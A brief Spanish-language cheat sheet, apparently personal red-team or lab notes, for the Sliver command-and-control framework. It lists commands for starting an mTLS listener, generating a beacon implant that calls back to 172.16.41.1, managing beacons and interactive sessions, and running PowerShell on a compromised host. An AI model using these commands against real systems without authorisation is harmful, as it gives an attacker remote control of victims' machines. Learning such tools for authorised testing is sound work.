## Listeners

> NOTA: mtls (para beacons), http (para stagers)

# Creas un listener

``` bash
mtls -l 8888
```

# Ver los listeners activos

```
jobs
```

## Beacons

``` bash
# Crear un implante
generate beacon --mtls 172.16.41.1 --save ~/projects/sliver
# Ver los implantes creados
implants
# Ver las beacons activos
beacons
```

## Sessions
- Azul: NO interactivo
- Rojo: interactivo

```bash
# hablar con un beacon
use ID
# hacerlo interacivo
interactive
# ver las sessiones activas
sessions
# hablar con una session
use ID
```
``` bash
execute -o powershell whoami
```
```bash
# Las tareas de larga duracion se convertiran en jobs
jobs
```

## Armory

```
armory install
```